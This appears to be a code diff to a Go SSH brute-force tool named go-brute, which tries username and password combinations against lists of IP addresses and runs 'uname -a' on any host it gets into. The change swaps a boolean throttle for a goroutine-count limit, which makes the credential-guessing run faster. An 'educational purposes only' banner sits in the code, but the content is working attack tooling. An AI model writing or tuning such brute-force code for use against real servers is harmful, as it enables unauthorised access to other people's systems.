@@ -22,7 +22,6 @@ var (
 	ip       string
 	threads  string
 	timeouts string
-	throttle bool
 )
 
 func init() {
@@ -64,7 +63,7 @@ func main() {
 
 	//Licensing and warning
 	fmt.Printf("\n\t\t\033- [31mWARNING\033[0m\n\033[36mThis binary is licensed under the Apache License 2.0\nThis binary is only intended for educational purposes only !\nYou can contribute to the project on https://github.com/yourfavDev/go-brute\n\n\033[0m")
-
+	timeoutAsInt, _ := strconv.Atoi(timeouts)
 	for i, _ := range combo {
 		if len(combo[i]) < 2 {
 			fmt.Printf("Mistyped line #%v ( %q )\n", i, lines2[i])
@@ -73,11 +72,11 @@ func main() {
 			for ix, _ := range ips {
 				time.Sleep(1 * time.Millisecond)
 				wg.Add(1)
-				go tryHost(combo[i][0], ips[ix], combo[i][1], "uname -a", &wg)
-				if throttle == false {
-					throttle = true
-					i, _ := strconv.Atoi(timeouts)
-					time.Sleep(time.Duration(i) * time.Second)
+				if runtime.NumGoroutine() < timeoutAsInt {
+					go tryHost(combo[i][0], ips[ix], combo[i][1], "uname -a", &wg)
+				} else {
+					time.Sleep(5 * time.Second)
+					go tryHost(combo[i][0], ips[ix], combo[i][1], "uname -a", &wg)
 				}
 			}
 		}
@@ -116,12 +115,10 @@ func tryHost(user string, addr string, pass string, cmd string, wg *sync.WaitGro
 
 	client, err := ssh.Dial("tcp", net.JoinHostPort(addr, port), config)
 	if err != nil {
-		throttle = false
 		return
 	} else {
 		session, err := client.NewSession()
 		if err != nil {
-			throttle = false
 			return
 		}
 
@@ -131,7 +128,6 @@ func tryHost(user string, addr string, pass string, cmd string, wg *sync.WaitGro
 		session.Close()
 
 		if err != nil {
-			throttle = false
 			return
 		}
 
@@ -140,7 +136,6 @@ func tryHost(user string, addr string, pass string, cmd string, wg *sync.WaitGro
 		session1, err := client.NewSession()
 
 		if err != nil {
-			throttle = false
 			return
 		}
 
@@ -150,7 +145,6 @@ func tryHost(user string, addr string, pass string, cmd string, wg *sync.WaitGro
 		session1.Close()
 
 		if err != nil {
-			throttle = false
 			return
 		}
 
